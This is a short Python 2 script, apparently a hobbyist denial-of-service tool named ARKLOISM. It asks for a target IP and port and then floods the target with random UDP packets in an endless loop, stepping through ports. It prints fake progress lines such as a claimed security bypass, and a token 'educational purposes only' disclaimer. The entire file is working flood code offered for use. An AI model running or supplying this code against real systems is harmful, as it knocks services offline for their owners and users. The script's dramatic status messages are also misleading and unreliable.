print ("\033[92m")
import sys
import os
import time
import socket
import random
#Time stamp
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet ARKLOISM")
print
print "Coded By : ARKLO"
print "Author   : ARKLO"
print "Github   : https://github.com/ARKLOGAMER"
print "DDos is an illegal activity, and this is for educational purposes only. DDOS attacks are illegal without the site owner's permission. So use it at your own risk. WE'LL NOT BE RESPONSIBLE FOR ANY TYPES OF MISISSUES!"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")
os.system("clear")
os.system("figlet ARKLOISM")
print("ACTIVATED ^-^")
print ("\033[92m")
print ">>>>>TRYING TO REACH THE SERVER<<<<<"
time.sleep(5)
print "_________________ESTABLISHING CONNECTION_______________________"
time.sleep(5)
print "_________SECURITY LAYER BYPASSED *-*_______________"
time.sleep(5)
print "_________________ARKLOISM ESTABLISHED________________________"
time.sleep(5)
print "    Let's Begin the party....   "
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
